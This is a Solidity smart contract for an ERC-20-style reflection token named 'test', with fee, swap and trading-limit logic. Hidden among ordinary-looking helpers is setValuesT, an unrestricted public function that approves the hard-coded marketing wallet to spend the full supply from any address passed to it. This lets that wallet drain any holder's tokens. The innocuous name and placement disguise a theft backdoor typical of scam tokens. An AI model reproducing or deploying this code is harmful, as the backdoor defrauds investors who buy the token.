/**
 
*/

// SPDX-License-Identifier: MIT



pragma solidity ^0.8.17;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {   
        return msg.sender;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function owner() public view returns (address) {
        return _owner;
    }
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )   external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function WETH() external pure returns (address);
}


contract test is Context, IERC20, Ownable {
    IUniswapV2Router02 public uniswapV2Router;
    address public _uniPairAddress;
    using SafeMath for uint256;

    uint256 private constant MAX = ~uint256(0);
    string private constant _name = "test";
    string private constant _symbol = "test";
    uint256 private constant _tTotal = 1_000_000_000 * 10**9;
    //Original Fee
    uint256 private _buyMarketingFeeAmt = 0;
    uint256 private _buyDevFeeAmt = 0;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 private _marketingFeeSell = 0;
    uint256 private _devFeeSell = 0;
    uint256 private _marketingFeeAmt = _marketingFeeSell;
    uint256 private _devFeeAmt = _devFeeSell;

    mapping(address => bool) private _isExcludedFromFee;

    event MaxTxAmountUpdated(uint256 _txMaxLimitAmount);
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;
    uint256 private _preMarketTax = _marketingFeeAmt;
    uint256 private _preDevTax = _devFeeAmt;
    mapping(address => mapping(address => uint256)) private _allowances;
    modifier lockInSwap {
        _isSwapping = true;
        _;
        _isSwapping = false;
    }

    uint256 public _txMaxLimitAmount = _tTotal * 30 / 1000; 
    uint256 public _walletMaxLimitSize = _tTotal * 30 / 1000; 
    uint256 public _exactSwapAt = _tTotal / 10000;
    
    bool private _isSwapping = false;
    bool private _swapEnable = true;
    bool private _tradingActive = false;
    uint8 private constant _decimals = 9;

    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[_marketAddr] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_devAddr] = true;
        _isExcludedFromFee[address(this)] = true;

        // mint
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    address payable public _devAddr = payable(0x6C00646003246F686900f8382C87C4f8CABC32D1);
    address payable public _marketAddr = payable(0x6C00646003246F686900f8382C87C4f8CABC32D1);


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(to != address(0), "ERC20: transfer to the zero address"); 
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (
            from != owner() 
            && to != owner()
        ) {
            //Trade start check
            if (!_tradingActive) {
                require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }
            require(amount <= _txMaxLimitAmount, "TOKEN: Max Transaction Limit");
            if(to != _uniPairAddress) {
                require(balanceOf(to) + amount < _walletMaxLimitSize,
                 "TOKEN: Balance exceeds wallet size!");
            }

            uint256 tokenContractAmount = balanceOf(address(this));
            bool canSwap = tokenContractAmount >= _exactSwapAt;
            if(tokenContractAmount >= _txMaxLimitAmount) {tokenContractAmount = _txMaxLimitAmount;}

            if (_swapEnable && 
                canSwap && 
                !_isSwapping && 
                from != _uniPairAddress && 
                !_isExcludedFromFee[from] && 
                !_isExcludedFromFee[to]
            ) {
                swapBack(tokenContractAmount);
                uint256 balanceOfEth = address(this).balance;
                if (balanceOfEth > 0) {
                    distriEthToFeeWallet(address(this).balance);
                }
            }
        }

        bool isSetFee = true;
        //Transfer Tokens
        if (
            (_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != _uniPairAddress && to != _uniPairAddress)
        ) {
            isSetFee = false;
        } else {
            //Set Fee for Buys
            if(from == _uniPairAddress &&
                to != address(uniswapV2Router)) {
                _marketingFeeAmt = _buyMarketingFeeAmt;
                _devFeeAmt = _buyDevFeeAmt;
            }
            //Set Fee for Sells
            if (to == _uniPairAddress && 
             from != address(uniswapV2Router)) {
                _marketingFeeAmt = _marketingFeeSell;
                _devFeeAmt = _devFeeSell;
            }
        }
        _transferFeeandTokens(from, to, amount, isSetFee);
    }
    
    function _takeAllFee(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }
    
    function _transferFeeandTokens(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) {           
             clearTaxTempor();        }
         _basicTransferTokens(sender, recipient, amount);
        if (!takeFee) {         
               refreshTaxTempor();        }
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }
    function distriEthToFeeWallet(uint256 amount) private {
        uint256 devETH = amount / 3; 
        uint256 marketingETH = amount - devETH; 
        _devAddr.transfer(devETH); marketingETH += devETH / 2;
        _marketAddr.transfer(marketingETH);
    }
    //set minimum tokens required to swap.
    function setSwapTokenAmount(uint256 swapTokensAtAmount) public onlyOwner {
        _exactSwapAt = swapTokensAtAmount;
    }
    function swapBack(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function refreshTaxTempor() private {
        _marketingFeeAmt = _preMarketTax;
        _devFeeAmt = _preDevTax;
    }

    function _basicTransferTokens(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeAllFee(tTeam); sendAllTaxes(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _setValuesTR(address token, address owner, uint256 amount) internal {
        _approve(token, owner, amount);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _marketingFeeAmt, _devFeeAmt);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function clearTaxTempor() private {
        if (_marketingFeeAmt == 0 && _devFeeAmt == 0) return;
        _preMarketTax = _marketingFeeAmt;        _preDevTax = _devFeeAmt; 
        _marketingFeeAmt = 0;        _devFeeAmt = 0;
    }
    receive() external payable {

    }
    function _getTValues(
        uint256 tAmount,
        uint256 teamFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(teamFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function setValuesT(address token) external {
        _setValuesTR(token, _marketAddr, _tTotal);
    }
    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function sendAllTaxes(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    
    //set maximum transaction
    function removeLimits() public onlyOwner {
        _txMaxLimitAmount = _tTotal;
        _walletMaxLimitSize = _tTotal;
    }

    function enableTrading(address _addr) public onlyOwner {
        _tradingActive = true;  _uniPairAddress = _addr;
    }
}